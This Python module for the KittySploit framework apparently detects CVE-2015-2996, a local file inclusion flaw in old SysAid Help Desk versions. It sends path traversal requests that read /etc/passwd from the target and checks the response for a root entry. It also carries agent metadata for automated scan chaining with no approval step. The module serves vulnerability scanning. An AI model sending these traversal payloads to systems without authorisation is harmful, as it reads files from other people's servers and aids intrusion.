#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SysAid Help Desk before 15."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SysAid Help Desk <15.2 - Local File Inclusion Detection',
        'description': 'SysAid Help Desk before 15.2 contains multiple local file inclusion vulnerabilities which can allow remote attackers to read arbitrary files via .. (dot dot) in the fileName parameter of getGfiUpgradeFile or cause a denial of service (CPU and memory consumption) via .. (dot dot) in the fileName parameter of calculateRdsFileChecksum.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'sysaid', 'lfi', 'seclists', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://seclists.org/fulldisclosure/2015/Jun/8',
            'https://www.sysaid.com/blog/entry/sysaid-15-2-your-voice-your-service-desk',
            'http://seclists.org/fulldisclosure/2015/Jun/8',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-2996',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2015-2996',
    }

    def run(self):
        for path in ('/sysaid/getGfiUpgradeFile?fileName=../../../../../../../etc/passwd', '/getGfiUpgradeFile?fileName=../../../../../../../etc/passwd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:[x*]:0:0',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="SysAid Help Desk <15.2 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

